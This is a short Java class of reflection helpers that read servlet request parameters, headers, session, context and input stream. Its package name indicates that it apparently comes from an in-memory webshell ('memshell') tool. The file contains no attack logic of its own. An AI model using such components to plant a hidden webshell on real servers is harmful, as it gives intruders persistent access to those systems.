package net.rebeyond.memshell.redefine;
import java.lang.reflect.InvocationTargetException;

public class MyRequest {
	public static String getParameter(Object request,String name) throws Exception
	{
		return (String)request.getClass().getMethod("getParameter", String.class).invoke(request, name);
	}
	public static Object getServletContext(Object request) throws Exception
	{
		return request.getClass().getMethod("getServletContext", null).invoke(request, new Object[] {});
	}
	public static String getHeader(Object request,String name) throws Exception
	{
		return (String)request.getClass().getMethod("getHeader", String.class).invoke(request, name);
	}
	
	public static Object getSession(Object request) throws Exception
	{
		return request.getClass().getMethod("getSession",  null).invoke(request, new Object[] {});
	}
	public static int getContentLength(Object request) throws Exception
	{
		return Integer.parseInt(request.getClass().getMethod("getContentLength",  null).invoke(request, new Object[] {}).toString());
	}
	
	public static Object getInputStream(Object request) throws Exception
	{
		return request.getClass().getMethod("getInputStream", null).invoke(request, new Object[] {});
	}
}
